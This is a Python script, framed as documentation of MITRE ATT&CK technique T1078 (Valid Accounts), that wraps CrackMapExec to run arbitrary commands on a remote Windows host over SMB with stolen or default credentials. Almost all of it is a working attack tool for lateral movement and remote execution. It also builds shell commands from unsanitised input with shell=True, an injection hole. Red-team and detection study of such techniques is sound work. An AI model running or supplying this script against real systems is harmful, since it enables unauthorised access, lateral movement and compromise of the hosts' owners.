# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1078: Valid Account
# Objective: Involves using legitimate credentials to access a target system. 
# This script demonstrates how to leverage stolen or default credentials for lateral movement or privilege escalation on a Windows target.

#!/usr/bin/env python3
import json
import subprocess
import sys
import argparse
from getpass import getpass

import json # Make sure this is at the top of your script

def run_command(command, username=None, password=None, host=None):
    try:
        if username and password and host:
            cmd = f"crackmapexec smb {host} -u '{username}' -p '{password}' -x '{command}' --json"
            print(f"[+] Running command on {host} as {username}: {command}")
            # print(f"[*] Executing: {cmd}") # Optional: can be noisy
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            print(f"[+] Running command locally: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            # Try to parse the JSON output
            try:
                output_data = json.loads(result.stdout)
                host_data = output_data[0]
                
                # The 'status' field tells you if it worked
                status = host_data.get('status')
                
                if status in ['Pwn3d!', 'ERROR:']: # CrackMapExec uses 'ERROR:' in the status field for some execution errors
                    if status == 'Pwn3d!':
                        command_output = host_data.get('output', 'No output returned.')
                        print(f"[+] Command executed successfully on {host}!")
                        print(f"[+] Output: {command_output}")
                    else:
                        # This is a more specific execution error
                        error_msg = host_data.get('output', 'Unknown execution error.')
                        print(f"[-] Command execution failed on {host}.")
                        print(f"[-] Reason: {error_msg}")
                else:
                    # This is an authentication or connection error
                    print(f"[-] Failed to connect or authenticate to {host}.")
                    print(f"[-] Status: {status}")
                    # The full JSON can be useful for debugging connection issues
                    # print(f"[-] Full Response: {host_data}")

            except (json.JSONDecodeError, IndexError, KeyError) as e:
                print(f"[-] Failed to parse CrackMapExec JSON output: {e}")
                print("[-] This might mean the command failed in a way that didn't produce valid JSON.")
                print("[*] Raw STDOUT:", result.stdout)
                print("[*] Raw STDERR:", result.stderr)

        else:
            print(f"[-] The crackmapexec process itself failed with return code {result.returncode}.")
            print("[-] This is often a connection or syntax error.")
            print("[*] Raw STDERR:", result.stderr)

    except Exception as e:
        print(f"[-] An unexpected exception occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="MITRE T1078: Valid Accounts - Credential-Based Attack Script")
    parser.add_argument("--username", help="Username for authentication (e.g., 'Administrator')")
    parser.add_argument("--password", help="Password for authentication (leave blank to prompt)")
    parser.add_argument("--host", help="Target host (e.g., '192.168.1.100')")
    parser.add_argument("--command", help="Command to execute (e.g., 'whoami')")
    args = parser.parse_args()

    # Check for the command first.
    if not args.command:
        print("[-] Error: --command is required!")
        sys.exit(1)

    # Get the password BEFORE using it in a check.
    password = args.password if args.password else getpass("Enter password: ")

    # Safely check the host and credentials.
    if args.host and not (args.username and password):
        print("[-] Error: For remote execution, --host, --username, and --password are required!")
        sys.exit(1)

    run_command(args.command, args.username, password, args.host)

if __name__ == "__main__":
    main()